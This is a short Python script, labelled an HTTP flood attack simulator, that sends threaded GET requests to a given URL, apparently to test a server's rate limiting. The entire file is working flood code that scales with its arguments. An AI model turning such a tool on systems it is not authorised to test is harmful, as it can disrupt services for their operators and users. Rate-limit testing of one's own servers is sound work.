import requests
import argparse
import threading
import time

# HTTP Flood Attack Script
# Simulates rapid HTTP GET requests to test rate limiting (50 requests in 60s)
# Usage: python http_flood.py --url http://<your-server-ip>/dashboard --requests 100 --threads 10

def send_request(url):
    try:
        response = requests.get(url, timeout=5)
        print(f"Sent request to {url}, Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error sending request: {e}")

def main():
    parser = argparse.ArgumentParser(description="HTTP Flood Attack Simulator")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://<your-server-ip>/dashboard)")
    parser.add_argument("--requests", type=int, default=100, help="Total number of requests")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    args = parser.parse_args()

    print(f"Starting HTTP flood attack on {args.url} with {args.requests} requests using {args.threads} threads...")
    threads = []
    for _ in range(args.requests):
        thread = threading.Thread(target=send_request, args=(args.url,))
        threads.append(thread)
        thread.start()
        if len(threads) >= args.threads:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()
    print("Attack completed.")

if __name__ == "__main__":
    main()